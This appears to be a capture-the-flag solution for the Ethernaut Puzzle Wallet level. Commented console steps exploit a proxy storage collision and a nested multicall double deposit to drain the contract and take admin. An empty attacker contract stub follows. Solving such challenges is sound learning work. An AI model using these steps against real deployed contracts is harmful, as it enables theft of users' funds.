// 1 - Set pendingAdmin to player address - owner is set - Chrome Console
// pendingAdmin = web3.eth.abi.encodeFunctionCall({
//     name: 'proposeNewAdmin',
//     type: 'function',
//     inputs: [{
//         type: 'address',
//         name: '_newAdmin'
//     }]
// }, [player]);

// await web3.eth.sendTransaction({
//     to: instance,
//     from: player,
//     data: pendingAdmin
// })

// 2 - Add to whitelist - Chrome Console
// await contract.addToWhitelist(player)

// 3 - Call Deposit function twice - Chrome Console
// deposit = web3.eth.abi.encodeFunctionCall({
//     name: 'deposit',
//     type: 'function',
//     inputs: []
// }, []);

// multicall = web3.eth.abi.encodeFunctionCall({
//     name: 'multicall',
//     type: 'function',
//     inputs: [{
//         type: 'bytes[]',
//         name: 'data'
//     }]
// }, [[deposit]]);

// nestedMulticallData = web3.eth.abi.encodeFunctionCall({
//     name: 'multicall',
//     type: 'function',
//     inputs: [{
//         type: 'bytes[]',
//         name: 'data'
//     }]
// }, [[deposit, multicall]]);

// await web3.eth.sendTransaction({
//     to: instance,
//     from: player,
//     value: "1000000000000000",
//     data: nestedMulticallData
// })

// 4 - Check balance of player
// (await contract.balances(player)).toString()

// 5 - Withdraw deposits
// await contract.execute(player,2000000000000000,"0x")

// 6 - Modify maxBalance as the contract balance is now 0
// await contract.setMaxBalance("0xb77070bD599655570a2aE22d33c0Df76107A21AE")

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract PuzzleWalletAttacker {}
